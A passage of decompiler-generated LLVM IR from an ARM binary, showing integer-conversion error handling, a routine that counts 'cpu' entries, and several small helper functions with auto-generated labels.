  br label %dec_label_pc_12db0

bb59:                                             ; preds = %dec_label_pc_12d9c
  %v3_12d9c = icmp ult i32 %v0_12d9c, %v1_12d9c
  %v1_12da8 = add i32 %v0_12da8, 1
  store i32 %v1_12da8, i32* %r4.global-to-local, align 4
  br i1 %v3_12d9c, label %dec_label_pc_12db0, label %dec_label_pc_12dc8

dec_label_pc_12db0:                               ; preds = %bb59, %.thread31
  %v1_12da836 = phi i32 [ %v1_12da832, %.thread31 ], [ %v1_12da8, %bb59 ]
  %v4_12db82235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_12db0 = load i32, i32* %sl.global-to-local, align 4
  %v3_12db0 = icmp uge i32 %v3_12dc0, %v1_12db0
  %v9_12db0 = icmp eq i32 %v3_12dc0, %v1_12db0
  %v2_12db4 = xor i1 %v3_12db0, true
  %v3_12db4 = or i1 %v9_12db0, %v2_12db4
  br i1 %v3_12db4, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_12db0
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_12db0, %bb60
  %v4_12db8 = phi i32 [ %v4_12db82235, %dec_label_pc_12db0 ], [ 0, %bb60 ]
  %v2_12db8 = xor i1 %v9_12db0, true
  %v3_12db8 = and i1 %v3_12db0, %v2_12db8
  br i1 %v3_12db8, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_12db8 = urem i32 %v4_12db8, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_12dbc = phi i32 [ %v5_12db8, %bb62 ], [ %v4_12db8, %bb61 ]
  %v2_12dbc = icmp eq i32 %v0_12dbc, 0
  br i1 %v2_12dbc, label %bb63, label %dec_label_pc_12dc8

bb63:                                             ; preds = %thread-pre-split
  %v4_12dc0 = mul i32 %v0_12d9c, %v1_12d94
  %v5_12dc0 = add i32 %v4_12dc0, %v3_12dc0
  store i32 %v5_12dc0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d68

dec_label_pc_12dc8:                               ; preds = %bb59, %thread-pre-split
  %v0_12dc8 = call i32 @function_11200()
  %v0_12dd0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12dd0, i32* %ip.global-to-local, align 4
  %v0_12dd4 = load i32, i32* @r7, align 4
  %v2_12dd4 = and i32 %v0_12dd4, %v0_12c98
  store i32 %v2_12dd4, i32* @r7, align 4
  %v2_12ddc = inttoptr i32 %v0_12dc8 to i32*
  store i32 34, i32* %v2_12ddc, align 4
  %v0_12d68.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d68

dec_label_pc_12de4.loopexit:                      ; preds = %bb58
  %v0_12de4.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %.thread, %dec_label_pc_12de4.loopexit
  %v2_12de8 = phi i32 [ %v0_12de4.pre, %dec_label_pc_12de4.loopexit ], [ %v0_12c8c, %.thread ]
  %v2_12de4 = icmp eq i32 %v2_12de8, 0
  br i1 %v2_12de4, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_12de4
  %v1_12de8 = load i32, i32* %r6.global-to-local, align 4
  %v3_12de8 = inttoptr i32 %v2_12de8 to i32*
  store i32 %v1_12de8, i32* %v3_12de8, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_12de4, %bb64
  %v0_12df0 = load i32, i32* @r7, align 4
  %v2_12df0 = icmp eq i32 %v0_12df0, 0
  %. = select i1 %v2_12df0, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_12dfc = icmp eq i32 %v0_12c98, 0
  %v0_12e20.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_12dfc, label %dec_label_pc_12e18, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_12e20.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_12e08, label %dec_label_pc_12e18

dec_label_pc_12e08:                               ; preds = %bb68
  %v0_12e08 = call i32 @function_11200()
  %v2_12e10 = inttoptr i32 %v0_12e08 to i32*
  store i32 34, i32* %v2_12e10, align 4
  %v0_12e14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12e14, i32* %ip.global-to-local, align 4
  %v0_12e18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %bb68, %bb65, %dec_label_pc_12e08
  %v0_12e20.pre = phi i32 [ %v0_12e20.pre.pre, %bb68 ], [ %v0_12e14, %dec_label_pc_12e08 ], [ %v0_12e20.pre.pre, %bb65 ]
  %v0_12e18 = phi i32 [ %v0_12df0, %bb68 ], [ %v0_12e18.pre, %dec_label_pc_12e08 ], [ %v0_12df0, %bb65 ]
  %v2_12e18 = icmp eq i32 %v0_12e18, 0
  br i1 %v2_12e18, label %dec_label_pc_12e18._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_12e18
  %v2_12e1c = sub i32 0, %v0_12e20.pre
  store i32 %v2_12e1c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12e18._crit_edge

dec_label_pc_12e18._crit_edge:                    ; preds = %dec_label_pc_12e18, %bb69
  %v0_12e20 = phi i32 [ %v2_12e1c, %bb69 ], [ %v0_12e20.pre, %dec_label_pc_12e18 ]
  store i32 %v3_12c78, i32* @r4, align 4
  ret i32 %v0_12e20

; uselistorder directives
  uselistorder i32 %v0_12e20.pre, { 1, 0 }
  uselistorder i32 %v0_12e20.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_12db8, { 1, 0 }
  uselistorder i1 %v3_12db0, { 1, 0 }
  uselistorder i32 %v1_12db0, { 1, 0 }
  uselistorder i32 %v1_12d7c, { 1, 0 }
  uselistorder i32 %v1_12d74, { 1, 0 }
  uselistorder i32 %v0_12da8, { 1, 0, 2 }
  uselistorder i32 %v0_12d68, { 1, 0 }
  uselistorder i32 %v3_12d18, { 1, 0 }
  uselistorder i32 %v1_12d0c, { 1, 0, 2 }
  uselistorder i32 %v0_12cdc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12c98, { 1, 0 }
  uselistorder i32 %v0_12c90, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 ()* @function_10874, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 (i32, i32)* @function_10970, { 3, 2, 0, 6, 1, 5, 4 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12e18._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12e18, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_12de4, { 1, 0 }
  uselistorder label %dec_label_pc_12dc8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12d6c, { 1, 0 }
  uselistorder label %dec_label_pc_12d68, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ce0, { 1, 0 }
  uselistorder label %dec_label_pc_12cdc, { 1, 0 }
  uselistorder label %dec_label_pc_12ca4, { 1, 0 }
}

define i32 @function_12e38(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e38:
  %stack_var_-16 = alloca i32, align 4
  store i32 124804, i32* @r5, align 4
  %v4_12e44 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  store i32 %v4_12e44, i32* @r4, align 4
  %v2_12e4c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_12e64 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12e64)
  %v0_12e78 = load i32, i32* @r5, align 4
  %v2_12e78 = add i32 %v0_12e78, 16
  %v3_12e78 = inttoptr i32 %v2_12e78 to i32*
  %v4_12e78 = load i32, i32* %v3_12e78, align 4
  call void @__pseudo_branch(i32 %v4_12e78)
  %v4_12e88 = load i32, i32* @global_var_1ea20.419, align 4
  %v2_12e8c = icmp eq i32 %v4_12e88, 0
  br i1 %v2_12e8c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12e38
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12e38, %bb
  %v2_12e98 = xor i1 %v2_12e8c, true
  call void @__pseudo_cond_branch(i1 %v2_12e98, i32 %v4_12e88)
  store i32 %v2_12e4c, i32* @r0, align 4
  %v0_12ea8 = load i32, i32* @r5, align 4
  %v2_12ea8 = add i32 %v0_12ea8, 24
  %v3_12ea8 = inttoptr i32 %v2_12ea8 to i32*
  %v4_12ea8 = load i32, i32* %v3_12ea8, align 4
  call void @__pseudo_branch(i32 %v4_12ea8)
  %v0_12eb4 = call i32 @function_13704()
  %v0_12ebc = load i32, i32* @r5, align 4
  %v9_12ebc = icmp eq i32 %v0_12ebc, 39908
  br i1 %v9_12ebc, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_12ec4 = xor i1 %v9_12ebc, true
  call void @__pseudo_cond_branch(i1 %v2_12ec4, i32 ptrtoint (i32* @global_var_14ba0.422 to i32))
  %v0_12ec8 = load i32, i32* @r6, align 4
  %v1_12ecc = call i32 @function_1416c(i32 %v0_12ec8)
  %v0_12ed0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ed0, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v3_12ed0 = load i32, i32* @sb, align 4
  %v8_12ed0 = lshr i32 %v4_12ea8, %v3_12ed0
  %v9_12ed0 = and i32 %v8_12ed0, %v1_12ecc
  store i32 %v9_12ed0, i32* @fp, align 4
  %v2_12ed4 = load i32, i32* @r8, align 4
  %v2_12ee4 = load i32, i32* @r2, align 4
  %v3_12ee4 = mul i32 %v2_12ee4, %v4_12ea8
  %v8_12ee8 = shl i32 %v2_12ed4, %v3_12ee4
  %v9_12ee8 = and i32 %v8_12ee8, %v3_12ee4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_12ee8 = phi i32 [ %v1_12ecc, %bb9 ], [ %v9_12ee8, %bb10 ]
  ret i32 %v10_12ee8

; uselistorder directives
  uselistorder i32 %v1_12ecc, { 1, 0 }
  uselistorder i1 %v9_12ebc, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12ef0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ef0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_12ef0 = load i32, i32* @r4, align 4
  %v6_12ef0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_12ef4 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_12ef4, label %dec_label_pc_12f88, label %dec_label_pc_12f04

dec_label_pc_12f04:                               ; preds = %dec_label_pc_12ef0
  %v2_12f14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_12f28 = call i32 @function_13b7c(i32 17, i32 0, i32 %v2_12f14)
  %v3_12f2c = load i32, i32* %stack_var_-44, align 4
  %v7_12f30 = icmp eq i32 %v3_12f2c, 1
  br i1 %v7_12f30, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12f04
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12f04, %bb
  call void @__pseudo_cond_branch(i1 %v7_12f30, i32 ptrtoint (i32* @global_var_10da0.424 to i32))
  %v2_12f44 = ptrtoint i32* %stack_var_-16 to i32
  %v2_12f4c = call i32 @function_140b0(i32 %v2_12f44, i32 %v2_12f44)
  %v2_12f50 = icmp eq i32 %v2_12f4c, 0
  br i1 %v2_12f50, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_12f64 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_12f64, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_12f74 = load i32, i32* %stack_var_-24, align 4
  %v1_12f78 = and i32 %v3_12f74, 65536
  %v2_12f78 = icmp eq i32 %v1_12f78, 0
  br i1 %v2_12f78, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_12f78, i32 ptrtoint (i32* @global_var_10da0.424 to i32))
  %v0_12f88.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12f88:                               ; preds = %dec_label_pc_12ef0, %.thread6
  %v0_12f88 = phi i32 [ %v0_12f88.pre, %.thread6 ], [ 0, %dec_label_pc_12ef0 ]
  store i32 %v3_12ef0, i32* @r4, align 4
  store i32 %v6_12ef0, i32* @lr, align 4
  ret i32 %v0_12f88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_13b7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f88, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12f9c() local_unnamed_addr {
dec_label_pc_12f9c:
  %stack_var_-36 = alloca i32, align 4
  store i32 124804, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_16408.428 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_12fbc = call i32 @function_145e0(i32 ptrtoint ([11 x i8]* @global_var_16408.428 to i32))
  store i32 %v2_12fbc, i32* @r6, align 4
  %v2_12fc0 = icmp eq i32 %v2_12fbc, 0
  br i1 %v2_12fc0, label %dec_label_pc_13040, label %dec_label_pc_12fc8

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12f9c
  store i32 224, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_16414.431 to i32), i32* @r8, align 4
  %v2_12fd4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12fd4, i32* @r7, align 4
  br label %bb18

dec_label_pc_12fdc:                               ; preds = %bb18
  %v3_12fdc = load i32, i32* %stack_var_-36, align 4
  %v1_12fe0 = inttoptr i32 %v3_12fdc to i32*
  %v2_12fe0 = load i32, i32* %v1_12fe0, align 4
  %v1_12fe4 = inttoptr i32 %v2_12fe0 to i8*
  %v2_12fe4 = load i8, i8* %v1_12fe4, align 1
  %v7_12fe8 = icmp eq i8 %v2_12fe4, 99
  br i1 %v7_12fe8, label %dec_label_pc_12ff0, label %.backedge3

dec_label_pc_12ff0:                               ; preds = %dec_label_pc_12fdc
  %v1_12ff0 = add i32 %v2_12fe0, 1
  %v2_12ff0 = inttoptr i32 %v1_12ff0 to i8*
  %v3_12ff0 = load i8, i8* %v2_12ff0, align 1
  %v7_12ff4 = icmp eq i8 %v3_12ff0, 112
  br i1 %v7_12ff4, label %dec_label_pc_12ffc, label %.backedge3

dec_label_pc_12ffc:                               ; preds = %dec_label_pc_12ff0
  %v1_12ffc = add i32 %v2_12fe0, 2
  %v2_12ffc = inttoptr i32 %v1_12ffc to i8*
  %v3_12ffc = load i8, i8* %v2_12ffc, align 1
  %v7_13000 = icmp eq i8 %v3_12ffc, 117
  br i1 %v7_13000, label %dec_label_pc_13008, label %.backedge3

dec_label_pc_13008:                               ; preds = %dec_label_pc_12ffc
  %v1_13008 = add i32 %v2_12fe0, 3
  %v2_13008 = inttoptr i32 %v1_13008 to i8*
  %v3_13008 = load i8, i8* %v2_13008, align 1
  %v4_13008 = zext i8 %v3_13008 to i32
  %v0_1300c = load i32, i32* @r4, align 4
  %v1_1300c = load i32, i32* @sl, align 4
  %v2_1300c = add i32 %v1_1300c, %v0_1300c
  %v3_1300c = inttoptr i32 %v2_1300c to i32*
  %v4_1300c = load i32, i32* %v3_1300c, align 4
  %v2_13010 = mul nuw nsw i32 %v4_13008, 2
  %v2_13014 = add i32 %v4_1300c, %v2_13010
  %v3_13014 = inttoptr i32 %v2_13014 to i16*
  %v4_13014 = load i16, i16* %v3_13014, align 2
  %v1_13018 = and i16 %v4_13014, 8
  %v2_13018 = icmp eq i16 %v1_13018, 0
  br i1 %v2_13018, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13008
  %v1_1301c = load i32, i32* @r5, align 4
  %v2_1301c = add i32 %v1_1301c, 1
  store i32 %v2_1301c, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13008, %dec_label_pc_12fdc, %dec_label_pc_12ff0, %dec_label_pc_12ffc
  %v0_13020.pre = load i32, i32* @r6, align 4
  %v0_1302c.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_12fc8
  %v0_1302c = phi i32 [ %v0_1302c.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_16414.431 to i32), %dec_label_pc_12fc8 ]
  %v0_13020 = phi i32 [ %v0_13020.pre, %.backedge3 ], [ %v2_12fbc, %dec_label_pc_12fc8 ]
  %v4_13030 = inttoptr i32 %v0_13020 to i32*
  %v5_13030 = call i32 @function_14284(i32* %v4_13030, i32 %v2_12fd4, i32 258, i32 %v0_1302c)
  %v2_13034 = icmp eq i32 %v5_13030, 0
  br i1 %v2_13034, label %dec_label_pc_130a4, label %dec_label_pc_12fdc

dec_label_pc_13040:                               ; preds = %dec_label_pc_12f9c
  store i32 ptrtoint ([14 x i8]* @global_var_16418.434 to i32), i32* @r0, align 4
  %v2_13048 = call i32 @function_145e0(i32 ptrtoint ([14 x i8]* @global_var_16418.434 to i32))
  store i32 %v2_13048, i32* @r6, align 4
  %v2_1304c = icmp eq i32 %v2_13048, 0
  br i1 %v2_1304c, label %bb19, label %dec_label_pc_13058

bb19:                                             ; preds = %dec_label_pc_13040
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_130a4

dec_label_pc_13058:                               ; preds = %dec_label_pc_13040
  store i32 ptrtoint ([10 x i8]* @global_var_16428.436 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1644c.438 to i32), i32* @r7, align 4
  %v2_13068 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13068, i32* @r4, align 4
  br label %bb21

dec_label_pc_13070:                               ; preds = %bb21
  %v0_1309c = load i32, i32* @r8, align 4
  %v1_1309c = inttoptr i32 %v0_1309c to i8*
  %v3_13070 = load i32, i32* %stack_var_-36, align 4
  %v1_13074 = inttoptr i32 %v3_13070 to i32*
  %v2_13074 = load i32, i32* %v1_13074, align 4
  store i32 %v2_13074, i32* @r1, align 4
  %v4_13078 = call i32 @function_15890(i8* %v1_1309c, i32 %v2_13074)
  %v2_1307c = icmp eq i32 %v4_13078, 0
  br i1 %v2_1307c, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13070
  %v1_13080 = load i32, i32* @r5, align 4
  %v2_13080 = add i32 %v1_13080, 1
  store i32 %v2_13080, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13070
  %v0_1308c.pre = load i32, i32* @r7, align 4
  %v0_13090.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13058
  %v0_13090 = phi i32 [ %v0_13090.pre, %.backedge ], [ %v2_13048, %dec_label_pc_13058 ]
  %v0_1308c = phi i32 [ %v0_1308c.pre, %.backedge ], [ ptrtoint (i32* @global_var_1644c.438 to i32), %dec_label_pc_13058 ]
  %v4_13094 = inttoptr i32 %v0_13090 to i32*
  %v5_13094 = call i32 @function_14284(i32* %v4_13094, i32 %v2_13068, i32 459266, i32 %v0_1308c)
  %v2_13098 = icmp eq i32 %v5_13094, 0
  br i1 %v2_13098, label %dec_label_pc_130a4, label %dec_label_pc_13070

dec_label_pc_130a4:                               ; preds = %bb18, %bb21, %bb19
  %v0_130a4 = load i32, i32* @r6, align 4
  %v1_130a8 = inttoptr i32 %v0_130a4 to i32*
  %v2_130a8 = call i32 @function_145ac(i32* %v1_130a8)
  %v0_130ac = load i32, i32* @r5, align 4
  %v2_130ac = icmp eq i32 %v0_130ac, 0
  %.v0_130ac = select i1 %v2_130ac, i32 1, i32 %v0_130ac
  ret i32 %.v0_130ac

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @function_145e0, { 1, 0 }
  uselistorder label %dec_label_pc_130a4, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_130e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_130e8:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_134d0

bb:                                               ; preds = %dec_label_pc_130e8
  %v7_130fc = mul i32 %arg1, 4
  %v8_130fc = add i32 %v7_130fc, ptrtoint (i32* @global_var_13104.441 to i32)
  call void @__pseudo_branch(i32 %v8_130fc)
  br label %dec_label_pc_134d0

dec_label_pc_134d0:                               ; preds = %bb, %dec_label_pc_130e8
  %v0_134d0 = call i32 @function_11200()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_134dc = inttoptr i32 %v0_134d0 to i32*
  store i32 22, i32* %v2_134dc, align 4
  %v0_1368c = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_1368c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_13704() local_unnamed_addr {
dec_label_pc_13728.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13704 = load i32, i32* @r4, align 4
  store i32 %v3_13704, i32* %stack_var_-16, align 4
  store i32 124796, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %dec_label_pc_13728.dec_label_pc_13728_crit_edge, %dec_label_pc_13728.lr.ph
  %v1_13728 = phi i32 [ %v1_13734, %dec_label_pc_13728.dec_label_pc_13728_crit_edge ], [ 0, %dec_label_pc_13728.lr.ph ]
  %v0_13728 = phi i32 [ %v0_13728.pre, %dec_label_pc_13728.dec_label_pc_13728_crit_edge ], [ 124796, %dec_label_pc_13728.lr.ph ]
  %v4_13728 = mul i32 %v1_13728, 4
  %v5_13728 = add i32 %v4_13728, %v0_13728
  %v6_13728 = inttoptr i32 %v5_13728 to i32*
  %v7_13728 = load i32, i32* %v6_13728, align 4
  call void @__pseudo_branch(i32 %v7_13728)
  %v0_13734 = load i32, i32* %r4.global-to-local, align 4
  %v1_13734 = add i32 %v0_13734, -1
  store i32 %v1_13734, i32* %r4.global-to-local, align 4
  %v2_13734 = icmp eq i32 %v0_13734, 0
  br i1 %v2_13734, label %dec_label_pc_1373c, label %dec_label_pc_13728.dec_label_pc_13728_crit_edge

dec_label_pc_13728.dec_label_pc_13728_crit_edge:  ; preds = %dec_label_pc_13728
  %v0_13728.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13728

dec_label_pc_1373c:                               ; preds = %dec_label_pc_13728
  %v4_13740 = load i32, i32* @global_var_1ea30.454, align 4
  %v2_13744 = icmp eq i32 %v4_13740, 0
  br i1 %v2_13744, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1373c
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1373c, %bb
  %v2_1374c = xor i1 %v2_13744, true
  call void @__pseudo_cond_branch(i1 %v2_1374c, i32 %v4_13740)
  %v4_13754 = load i32, i32* @global_var_1ea34.456, align 4
  %v2_13758 = icmp eq i32 %v4_13754, 0
  br i1 %v2_13758, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_13760 = xor i1 %v2_13758, true
  call void @__pseudo_cond_branch(i1 %v2_13760, i32 %v4_13754)
  %v2_13764 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13764, i32* %r4.global-to-local, align 4
  %v1_13768 = load i32, i32* @r0, align 4
  ret i32 %v1_13768

; uselistorder directives
  uselistorder i32 %v1_13734, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_13780(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13780:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_13794 = call i32 @function_10c0c(i32 %arg1, i32 1)
  %v3_1379c = icmp eq i32 %v2_13794, -1
  store i32 124804, i32* @r3, align 4
  br i1 %v3_1379c, label %dec_label_pc_137a8, label %dec_label_pc_137c0

dec_label_pc_137a8:                               ; preds = %dec_label_pc_13780
  %v0_137ac = load i32, i32* %r5.global-to-local, align 4
  %v3_137b4 = call i32 @function_109e4(i32 ptrtoint ([10 x i8]* @global_var_16450.459 to i32), i32 %v0_137ac)
  %v1_137b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_137bc = icmp ne i32 %v3_137b4, %v1_137b8
  call void @__pseudo_cond_branch(i1 %v1_137bc, i32 ptrtoint (i32* @global_var_12b14.460 to i32))
  br label %dec_label_pc_137c0

dec_label_pc_137c0:                               ; preds = %dec_label_pc_13780, %dec_label_pc_137a8
  %v1_137c8 = phi i32 [ %v2_13794, %dec_label_pc_13780 ], [ %v3_137b4, %dec_label_pc_137a8 ]
  ret i32 %v1_137c8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_137c0, { 1, 0 }
}

define i32 @function_137d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_137d4:
  %r4.global-to-local = alloca i32, align 4
  store i32 124804, i32* %r4.global-to-local, align 4
  %v4_137e4 = load i32, i32* inttoptr (i32 124896 to i32*), align 32
  %v1_137e8 = inttoptr i32 %v4_137e4 to i32*
  %v2_137e8 = load i32, i32* %v1_137e8, align 4
  %v2_137ec = icmp eq i32 %v2_137e8, 0
  br i1 %v2_137ec, label %dec_label_pc_137f4, label %dec_label_pc_13828

dec_label_pc_137f4:                               ; preds = %dec_label_pc_137d4
  %v4_137f8 = load i32, i32* inttoptr (i32 124856 to i32*), align 8
  %v2_13800 = icmp eq i32 %v4_137f8, 0
  store i32 4096, i32* %v1_137e8, align 4
  br i1 %v2_13800, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_137f4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_137f4, %bb
  %v2_1380c = xor i1 %v2_13800, true
  call void @__pseudo_cond_branch(i1 %v2_1380c, i32 %v4_137f8)
  %v0_13814 = load i32, i32* %r4.global-to-local, align 4
  %v2_1381c = icmp eq i32 %v0_13814, 40064
  br i1 %v2_1381c, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_13824 = xor i1 %v2_1381c, true
  call void @__pseudo_cond_branch(i1 %v2_13824, i32 ptrtoint (i32* @global_var_14b04.465 to i32))
  br label %dec_label_pc_13828

dec_label_pc_13828:                               ; preds = %dec_label_pc_137d4, %bb6
  %v1_1382c = load i32, i32* @r0, align 4
  ret i32 %v1_1382c

; uselistorder directives
  uselistorder i1 %v2_1381c, { 1, 0 }
  uselistorder label %dec_label_pc_13828, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13840(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13840:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_13848 = add i32 %tmp, 4
  store i32 %v1_13848, i32* %ip.global-to-local, align 4
